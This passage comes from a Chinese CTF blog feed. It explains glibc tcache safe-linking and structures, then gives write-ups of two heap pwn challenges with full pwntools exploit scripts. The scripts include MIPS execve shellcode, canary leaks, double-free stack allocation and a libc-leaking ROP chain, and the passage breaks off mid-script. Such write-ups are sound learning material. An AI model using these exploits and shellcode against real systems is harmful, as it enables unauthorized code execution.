REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></code></pre><p>会将pos右移12位之后再和ptr抑或，pos实际上就是要free的堆的地址，ptr则是对应链表的尾部</p><p>结合一个小程序来看看具体现象</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>a<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>b<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>free(a)之后</p><p><a href="https://imgtu.com/i/c2fhiq" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/15/c2fhiq.png" alt="c2fhiq.png"></a></p><p>fd指针为<code>0x0000000555555757</code></p><p>由<code>0x5555557572a0&gt;&gt;12&amp;0</code>计算得来，在free(a之前，因为pos为0x5555557572a0，而tcache-&gt;entries[tc_idx]为0</p><p>free(a)之后，tcache-&gt;entries[tc_idx]为0x5555557572a0，当free(b)时，pos为0x5555557572f0，ptr为0x5555557572a0，所以此时的e-&gt;next会被赋值为<code>0x5555557572f0&gt;&gt;12^0x5555557572a0=0x00005550002025f7</code></p><p><a href="https://imgtu.com/i/c2oigP" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/15/c2oigP.png" alt="c2oigP.png"></a></p><p>safe-linking的实现大概就是这样</p><h2 id="0x1e-tcache结构体"><a href="#0x1e-tcache结构体" class="headerlink" title="0x1e.tcache结构体"></a>0x1e.tcache结构体</h2><p>上面既然记录了tcache相关的一些知识，就顺便再记录一下tcache相关的结构体</p><p>依然拿2.32举例</p><h3 id="1-typedef-struct-tcache-entry"><a href="#1-typedef-struct-tcache-entry" class="headerlink" title="1.typedef struct tcache_entry"></a>1.typedef struct tcache_entry</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_entry<span class="token punctuation">{</span>  <span class="token keyword">struct</span> tcache_entry <span class="token operator">*</span>next<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* This field exists to detect double frees.  */</span>  <span class="token keyword">struct</span> tcache_perthread_struct <span class="token operator">*</span>key<span class="token punctuation">;</span><span class="token punctuation">}</span> tcache_entry<span class="token punctuation">;</span></code></pre><p>这个结构体就是我们一直在攻击的tcache的实现，应该说一目了然，next指针就是指向下一个tcache，key指针防止double free，存放着tcache_perthread_struct的地址</p><h3 id="2-tcache-perthread-struct"><a href="#2-tcache-perthread-struct" class="headerlink" title="2.tcache_perthread_struct"></a>2.tcache_perthread_struct</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_perthread_struct<span class="token punctuation">{</span>  uint16_t counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> tcache_perthread_struct<span class="token punctuation">;</span></code></pre><p>这个堆块结构体用来管理tcache</p><pre class=" language-c"><code class="language-c"><span class="token macro property"># <span class="token directive keyword">define</span> TCACHE_MAX_BINS        64</span></code></pre><p>两个成员分别为一个uint16类型的数组，大小为64；以及一个指针数组，大小依然是64；</p><p>counts数组用来表示某个大小的tcache的数量，比如有两个0x20的tcache，那么counts[0]即为2；entries这个数组用来存储某条tcache链表的链表头。</p><p>和其他bins的不一样，tcache_perthread_struct由malloc分配空间，也就是说tcache_perthread_struct这个结构体的位置在heap段，glibc2.32中的大小为0x290，其中counts数组大小为0x40*2=0x80，2.27中大小为0x250.</p><p>这里顺带再介绍一下<code>TCACHE_MAX_BINS</code>的攻击方式。</p><p>前面说了，counts数组用来记录tcache的数量，在__libc_malloc函数中有如下代码</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_bins      <span class="token operator">&amp;&amp;</span> tcache      <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token function">tcache_get</span> <span class="token punctuation">(</span>tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>其中的tcache_bins就是TCACHE_MAX_BINS，如果tc_idx小于TCACHE_MAX_BINS并且有tcache且counts[tc_idx]数组不为空，就会调用tcache_get函数。</p><p><code>TCACHE_MAX_BINS</code>的攻击方式和<code>global_max_fast</code>的攻击方式有相似之处，如果我们能将<code>TCACHE_MAX_BINS</code>修改成一个很大的值，那么<code>tcache_perthread_struct</code>这个结构体也会很大，可能会与我们的可控区域重合，我们在可控区域中的某个位置写入一个地址，如malloc_hook，然后再计算出这个位置对应的tcache大小，然后申请(前提是可以申请这么大的chunk并且count[tc_idx]对应的位置不为空)这么大的chunk，就会将malloc_hook分配给用户。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一下pwn的一些小技巧以及一些利用方式，想到哪个写哪个吧。&lt;/p&gt;
&lt;h2 id=&quot;0x1-stack-smashing-detected的利用&quot;&gt;&lt;a href=&quot;#0x1-stack-smashing-detected的利用&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="PWN" scheme="https://lawliet.ren/categories/PWN/"/>
    
    
      <category term="trick" scheme="https://lawliet.ren/tags/trick/"/>
    
  </entry>
  
  <entry>
    <title>七星计划(2)</title>
    <link href="https://lawliet.ren/2020/11/15/qi-xing-ji-hua-2/"/>
    <id>https://lawliet.ren/2020/11/15/qi-xing-ji-hua-2/</id>
    <published>2020-11-15T04:56:53.000Z</published>
    <updated>2020-11-17T05:13:00.094Z</updated>
    
    <content type="html"><![CDATA[<p>这一次来记载一些题目吧~</p><p>先从最近的题目开始</p><h2 id="0x1-太湖杯-easykooc"><a href="#0x1-太湖杯-easykooc" class="headerlink" title="0x1.太湖杯-easykooc"></a>0x1.太湖杯-easykooc</h2><p>首先检查保护</p><p><a href="https://imgchr.com/i/DAs8jH" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/16/DAs8jH.png" alt="DAs8jH.png"></a></p><p>mips32小端序，存在RWX段，所以可以执行shellcode</p><p>然后IDA…啊不，是ghidra分析(好想体验IDA分析mips的感觉啊，虽然ghidra反编译的也挺好)</p><p><a href="https://imgchr.com/i/DAsaUP" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/16/DAsaUP.png" alt="DAsaUP.png"></a></p><p>一个堆题，一开始会申请一个0x68的chunk，然后给出栈地址，进入while循环</p><p>先看到add函数</p><p><a href="https://imgchr.com/i/DAy8iV" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/16/DAy8iV.png" alt="DAy8iV.png"></a></p><p>能分配的chunk大小是固定的0x40</p><p>看到delete函数</p><p><a href="https://imgchr.com/i/DAg4oR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/16/DAg4oR.png" alt="DAg4oR.png"></a></p><p>存在uaf</p><p>再看到功能3</p><p><a href="https://imgchr.com/i/DAgHSK" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/16/DAgHSK.png" alt="DAgHSK.png"></a></p><p>往austack44中读入0x24个字节的值，而austack44只有32字节的长度</p><p><img src="/LawlietLW.github.io/2020/11/15/qi-xing-ji-hua-2/C:%5CUsers%5C24990%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201116175906584.png" alt="image-20201116175906584"></p><p>可以泄露canary</p><p>整体思路就是，最开始往0x68的chunk里读入数据时将shellcode写入其中，再通过edit功能泄露canary，然后再通过edit功能在栈中伪造一个0x41的chunk，利用double free泄露堆地址，再将fake chunk链入到bin中，就可以把chunk申请到栈上，把main函数的返回地址修改成写有shellcode的堆地址，当退出while循环时就能够执行shellcode了。</p><p>由于不大清楚怎么调试mips的exp，所以各种数据只能先调试好再写exp，很难受，exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io=process(['qemu-mipsel','-L','./mipsel-linux-gnu','./easyKooc'])</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'121.36.166.138'</span><span class="token punctuation">,</span><span class="token number">8893</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Plz input your choice\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Plz input your todo id!\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input your content\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Plz input your choice\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Plz input your todo id!\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Plz input your choice\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What message do you want to leave?\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>shellcode  <span class="token operator">=</span> <span class="token string">""</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x06\x28"</span>  <span class="token comment" spellcheck="true"># slti $a2, $zero, -1</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x62\x69\x0f\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t7, 0x6962</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x2f\x2f\xef\x35"</span>  <span class="token comment" spellcheck="true"># ori $t7, $t7, 0x2f2f</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xaf\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t7, -0xc($sp)</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x73\x68\x0e\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t6, 0x6873</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x6e\x2f\xce\x35"</span>  <span class="token comment" spellcheck="true"># ori $t6, $t6, 0x2f6e</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xae\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t6, -8($sp)</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xfc\xff\xa0\xaf"</span>  <span class="token comment" spellcheck="true"># sw $zero, -4($sp)</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xa4\x27"</span>  <span class="token comment" spellcheck="true"># addiu $a0, $sp, -0xc</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x05\x28"</span>  <span class="token comment" spellcheck="true"># slti $a1, $zero, -1</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xab\x0f\x02\x24"</span>  <span class="token comment" spellcheck="true"># addiu;$v0, $zero, 0xfab</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x01\x01\x01"</span>  <span class="token comment" spellcheck="true"># syscall 0x40404     </span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Plz input your motto!\n'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>stack<span class="token operator">=</span>int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'stack => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x21</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'The message for you is '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>canary<span class="token operator">=</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'canary => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your content is: '</span><span class="token punctuation">)</span>heap_addr<span class="token operator">=</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x18</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'heap_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Plz input your choice\n'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x2-西湖论剑-mmutag"><a href="#0x2-西湖论剑-mmutag" class="headerlink" title="0x2.西湖论剑-mmutag"></a>0x2.西湖论剑-mmutag</h2><p>检查保护</p><p><a href="https://imgchr.com/i/DEQzyF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/16/DEQzyF.png" alt="DEQzyF.png"></a></p><p>IDA分析</p><p><a href="https://imgchr.com/i/DE2XQK" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/17/DE2XQK.png" alt="DE2XQK.png"></a></p><p>和上一题一样会先申请一个0x68的chunk，会往其中读入数据，再给我们栈地址</p><p>进入while循环后有两个功能，依次分析</p><p><a href="https://imgchr.com/i/DERCFA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/17/DERCFA.png" alt="DERCFA.png"></a></p><p>第一个功能没什么用</p><p>看到第二个功能</p><p><a href="https://imgchr.com/i/DERmwQ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/17/DERmwQ.png" alt="DERmwQ.png"></a></p><p>一个菜单</p><p>功能1是申请一个0x68的chunk</p><p><a href="https://imgchr.com/i/DEfti9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/17/DEfti9.png" alt="DEfti9.png"></a></p><p>功能二是free一个chunk</p><p><a href="https://imgchr.com/i/DEfNGR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/17/DEfNGR.png" alt="DEfNGR.png"></a></p><p>存在uaf</p><p>功能三可以往栈写入一些数据，可以泄露出canary</p><p><a href="https://imgchr.com/i/DEfhsf" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/17/DEfhsf.png" alt="DEfhsf.png"></a></p><p><a href="https://imgchr.com/i/DEfbJs" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/17/DEfbJs.png" alt="DEfbJs.png"></a></p><p>所以整体思路为：先泄露出canary，再往栈中伪造0x71的chunk，利用uaf将chunk申请到栈上，然后写rop链泄露出libc地址，再用通用gadget往rsp写rop链getshell，exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./mmutag'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./mmutag'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'please input your choice:\n\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'please input your choise:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'please input your id:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input your content\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'please input your choise:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'please input your id:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'please input your choise:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit_</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'please input your choise:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>pop_rdi_ret<span class="token operator">=</span><span class="token number">0x0000000000400d23</span>ret_addr<span class="token operator">=</span><span class="token number">0x0000000000400679</span>csu_pop<span class="token operator">=</span><span class="token number">0x400d1a</span>csu_call<span class="token operator">=</span><span class="token number">0x400D00</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'please input you name: \n'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'lock'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>stack<span class="token operator">=</span>int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'stack => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>introduce<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x19</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your content: '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x19</span><span class="token punctuation">)</span>canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'canary => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>stack<span class="token number">-0x38</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>csu_pop<span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>csu_call<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>exit_<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token 